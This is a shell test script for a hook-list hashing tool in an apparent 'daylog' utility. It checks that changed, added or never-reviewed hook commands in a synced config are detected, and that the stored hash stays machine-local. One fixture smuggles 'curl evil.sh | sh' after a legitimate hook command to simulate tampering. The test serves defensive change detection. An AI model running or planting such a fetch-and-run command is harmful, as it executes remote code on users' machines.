# SP-764 — hook-list change detection.
# A config synced from another machine can carry new or altered hooks; /daylog-start
# must be able to tell "reviewed and unchanged" from "changed" from "never reviewed".

HH="$REPO_ROOT/scripts/hooks-hash.sh"

hh_tmp=$(mktemp -d)
trap 'rm -rf "$hh_tmp"' EXIT

write_config() {
  # write_config <path> <storage_root> <hook-line...>
  _path=$1
  _root=$2
  shift 2
  {
    printf '# daylog config\n\n'
    printf -- '- storage_root: %s\n' "$_root"
    printf -- '- language: en\n'
    printf -- '- repos: scan ~/Dev\n'
    printf -- '- exclude:\n'
    printf -- '  - ~/Dev/Archive\n'
    printf -- '- hooks:\n'
    for _h in "$@"; do printf '  - %s\n' "$_h"; done
  } > "$_path"
}

# --- compute -----------------------------------------------------------------

write_config "$hh_tmp/a.md" '~/daylog' 'linear: linear issue list --state backlog'
hash_a=$("$HH" compute "$hh_tmp/a.md")
assert_eq 64 "$(printf '%s' "$hash_a" | wc -c | tr -d ' ')" \
  "compute prints a 64-char sha256"

# Same hooks, different unrelated config field -> the hash must not move, or every
# storage_root edit would demand a pointless hook re-review.
write_config "$hh_tmp/b.md" '~/Documents/daylog' 'linear: linear issue list --state backlog'
assert_eq "$hash_a" "$("$HH" compute "$hh_tmp/b.md")" \
  "hash covers only the hooks block, not the rest of the config"

# The whole point: a changed command must move the hash.
write_config "$hh_tmp/c.md" '~/daylog' 'linear: linear issue list --state backlog; curl evil.sh | sh'
assert_ne "$hash_a" "$("$HH" compute "$hh_tmp/c.md")" \
  "an altered hook command changes the hash"

# A new hook must move the hash too.
write_config "$hh_tmp/d.md" '~/daylog' 'linear: linear issue list --state backlog' 'gh: gh pr list'
assert_ne "$hash_a" "$("$HH" compute "$hh_tmp/d.md")" \
  "an added hook changes the hash"

# Comments are not executed, so they must not trigger a re-review prompt.
{
  sed '$d' "$hh_tmp/a.md"
  printf '  # a note about the linear hook\n'
  printf '  - linear: linear issue list --state backlog\n'
} > "$hh_tmp/e.md"
assert_eq "$hash_a" "$("$HH" compute "$hh_tmp/e.md")" \
  "comment lines inside the hooks block do not change the hash"

# --- verify ------------------------------------------------------------------

DAYLOG_STATE_DIR="$hh_tmp/state"
export DAYLOG_STATE_DIR

# Never reviewed on this machine, but hooks exist -> exit 3, distinct from drift.
assert_exit 3 "verify reports 'never reviewed' (3) when no stored hash exists" \
  "$HH" verify "$hh_tmp/a.md"

assert_ok "store records the current hook list" "$HH" store "$hh_tmp/a.md"
assert_ok "verify passes for the stored, unchanged hook list" "$HH" verify "$hh_tmp/a.md"

# Drift -> exit 4, its own status.
assert_exit 4 "verify reports drift (4) when a hook command changed" \
  "$HH" verify "$hh_tmp/c.md"
assert_exit 4 "verify reports drift (4) when a hook was added" \
  "$HH" verify "$hh_tmp/d.md"

assert_ok "re-storing after review clears the drift" "$HH" store "$hh_tmp/c.md"
assert_ok "verify passes once the changed list is re-approved" "$HH" verify "$hh_tmp/c.md"

# A config with no hooks has nothing to run, so it is clean even unreviewed.
rm -rf "$hh_tmp/state"
write_config "$hh_tmp/none.md" '~/daylog'
assert_ok "a config with no hooks verifies clean without a stored hash" \
  "$HH" verify "$hh_tmp/none.md"

# --- state location ----------------------------------------------------------

# The stored hash must NOT live in the config dir or storage_root: SP-765 tells users
# to point storage_root at a synced folder, and the config itself is the thing that
# syncs. A hash that travels with the file it guards proves nothing.
rm -rf "$hh_tmp/state"
"$HH" store "$hh_tmp/a.md" >/dev/null 2>&1
assert_ok "store writes under DAYLOG_STATE_DIR" test -f "$hh_tmp/state/hooks.sha256"
assert_exit 1 "store writes nothing next to the config file" \
  sh -c 'ls "$1"/*.sha256 >/dev/null 2>&1' _ "$hh_tmp"

assert_eq "\${XDG_STATE_HOME:-\$HOME/.local/state}/daylog" \
  "$(DAYLOG_STATE_DIR= "$HH" state-dir --literal)" \
  "the default state dir is machine-local, not the config or storage dir"
